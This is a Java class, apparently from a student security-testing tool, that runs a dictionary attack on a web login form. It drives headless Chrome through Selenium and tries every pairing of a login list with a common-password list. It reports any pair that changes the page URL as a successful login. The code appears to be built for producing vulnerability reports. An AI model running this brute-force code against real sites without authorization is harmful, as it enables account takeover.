package fr.isep.softsecu.attackreport.attacks;

import fr.isep.softsecu.attackreport.Attack;
import fr.isep.softsecu.attackreport.Report;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.NoSuchElementException;

public class DictionaryAttack implements Attack {

    private static final int TIMEOUT = 200;
    private static final String LOGIN_FILE_PATH = "src/main/java/fr/isep/softsecu/attackreport/ressources/login.txt"; // Adjust the file path as needed
    private static final String PASSWORD_FILE_PATH = "src/main/java/fr/isep/softsecu/attackreport/ressources/password/30-most-common.txt"; // Adjust the file path as needed
    private static final List<String> LOGINS = loadFromFile(LOGIN_FILE_PATH);
    private static final List<String> PASSWORDS = loadFromFile(PASSWORD_FILE_PATH);
    private String loginUrlStr;

    static List<String> loadFromFile(String filePath) {
        List<String> data = new ArrayList<>();

        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = br.readLine()) != null) {
                data.add(line.trim());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return data;
    }


    @Override
    public List<Class<? extends Attack>> getRequiredPreviousAttacks() {
        return List.of(FindLoginPageAttack.class);
    }

    @Override
    public void setPreviousAttacks(List<Attack> previousAttacks) {
        for (Attack previousAttack : previousAttacks) {
            if (previousAttack instanceof FindLoginPageAttack findLoginPageAttack) {
                loginUrlStr = findLoginPageAttack.getLoginUrlStr();
            }
        }
    }

    @Override
    public void run(Report report, String ip, int port) {
        try {
            ChromeOptions options = new ChromeOptions();
            options.addArguments("--headless");
            WebDriver driver = new ChromeDriver(options);
            driver.get(loginUrlStr);
            driver.manage().timeouts().implicitlyWait(Duration.ofMillis(TIMEOUT));

            performDictionaryAttack(report, driver, loginUrlStr);

            driver.quit();
        } catch (Exception e) {
            System.out.println("Dictionary attack failed on " + loginUrlStr);
            e.printStackTrace();
        }
    }


    @Override
    public String getAttackName() {
        return "Dictionary Attack";
    }

    private void performDictionaryAttack(Report report, WebDriver driver, String urlStr) {
        try {
            System.out.println("Performing dictionary attack on " + urlStr);

            for (String login : LOGINS) {
                for (String password : PASSWORDS) {
                    driver.get(urlStr);
                    driver.manage().timeouts().implicitlyWait(Duration.ofMillis(TIMEOUT));

                    WebElement credential;

                    WebElement passwordElement = driver.findElement(By.name("password"));
                    WebElement submit = driver.findElement(By.cssSelector("[type='submit']"));

                    try {
                        credential = driver.findElement(By.cssSelector("input[name='email']"));
                    } catch (NoSuchElementException e) {
                        credential = driver.findElement(By.name("input[name='username']"));
                    }

                    System.out.println("Trying login \"" + login + "\" and password \"" + password + "\"");

                    credential.sendKeys(login);
                    passwordElement.sendKeys(password);
                    submit.click();

                    // Clicking the submit button may cause the page to reload or redirect, so we wait until timeout to check if the page has changed
                    try {
                        Thread.sleep(TIMEOUT);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if (!driver.getCurrentUrl().equals(urlStr)) {
                        System.out.println("Login successful with login \"" + login + "\" and password \"" + password + "\")");
                        report.append("Login successful with login \"" + login + "\" and password \"" + password + "\")");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public record LoginAttempt(String login, String password) {
    }
}
